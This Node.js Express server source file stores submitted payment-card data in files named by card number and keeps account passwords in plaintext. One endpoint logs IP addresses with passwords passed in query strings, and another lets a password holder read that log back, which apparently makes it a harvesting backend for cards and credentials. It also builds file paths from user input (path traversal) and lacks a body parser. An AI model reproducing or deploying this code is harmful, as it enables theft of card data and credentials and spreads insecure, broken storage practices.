const express = require('express');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const USER_COUNT_FILE = 'userCount.txt';

let userCount = 0;

app.use(cors());

// Function to read from a file using a Promise
function readFromFile(filePath) {
  return new Promise((resolve, reject) => {
    fs.readFile(filePath, 'utf8', (err, data) => {
      if (err) {
        reject(err);
        return;
      }
      resolve(data);
    });
  });
}

// Load user count from the file on server startup
fs.readFile(USER_COUNT_FILE, 'utf8', (err, data) => {
  if (!err) {
    userCount = parseInt(data) || 0;
    console.log(`Loaded user count: ${userCount}`);
  } else {
    console.log('Error reading user count file:', err);
  }
});

app.post('/processPayment', (req, res) => {
    const userData = req.body;
    console.log(userData);

    // Create 'users' directory if it doesn't exist
    const usersDirectory = path.join(__dirname, 'users');
    if (!fs.existsSync(usersDirectory)) {
        fs.mkdirSync(usersDirectory);
    }

    // Save data as JSON file
    const fileName = `${userData.cardNumber}.json`;
    const filePath = path.join(usersDirectory, fileName);

    fs.writeFile(filePath, JSON.stringify(userData, null, 2), err => {
        if (err) {
            console.error(err);
            return res.status(500).send('Error saving user data');
        }

        console.log(`User data saved to ${filePath}`);
        res.json({ message: 'User data saved successfully' });
    });
});

// Middleware to log user connections and increment count
app.use('/tom-browser', (req, res, next) => {
  userCount++;
  console.log(`User connected. Total users: ${userCount}`);
  saveUserCount();
  res.status(200).json({ status: 'success', message: 'User count incremented' });
  next();
});

app.post('/academy', (req, res) => {
  const { userType, name, email, password, subject } = req.body;

  // // Check if the username is already taken
  // if (isUsernameTaken(email)) {
  //   return res.status(400).json({ error: 'Username already taken' });
  // }

  // Create a user object
  const user = {
    userType,
    name,
    email,
    password,
    subject,
  };

  // Write the user data to a JSON file
  fs.writeFileSync(`academy-users/${email}.json`, JSON.stringify(user, null, 2));

  // Respond with a success message
  res.status(200).json({ message: 'Account created successfully' });
});

// Endpoint to show user count
app.use('/users', (req, res, next) => {
  res.send(`There are currently ${userCount} users that have registered using the TomMustBe12 Browser.`);
});

// Endpoint to log IP and password to a file
app.get('/log_ip', (req, res) => {
  const clientIP = req.query.ip;
  const password = req.query.password;

  // Log IP and password to a file (append)
  const logData = `IP: ${clientIP}, Password: ${password}<br>`;
  fs.appendFile('ips-for-script.txt', logData, (err) => {
    if (err) {
      console.error('Error logging IP:', err);
      return res.status(500).send('Error logging IP.');
    }
    console.log(`Logged IP: ${clientIP}`);
    res.send('IP and password logged successfully.');
  });
});

// Endpoint to view IPs (requires correct password)
app.get('/see-ips', async (req, res) => {
  const pwd = req.query.pwd;
  if (pwd === process.env['password']) {
    const ipFile = "ips-for-script.txt";
    try {
      const data = await readFromFile(ipFile);
      res.send(data.toString());
    } catch (error) {
      console.error('Error reading IP file:', error);
      res.status(500).send('Error reading IP file.');
    }
  } else {
    res.send("Wrong password.");
  }
});

// Serve static files from the 'public' directory
app.use(express.static('public'));

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

// Function to save user count to the file
function saveUserCount() {
  fs.writeFile(USER_COUNT_FILE, userCount.toString(), 'utf8', err => {
    if (err) {
      console.log('Error writing user count file:', err);
    }
  });
}
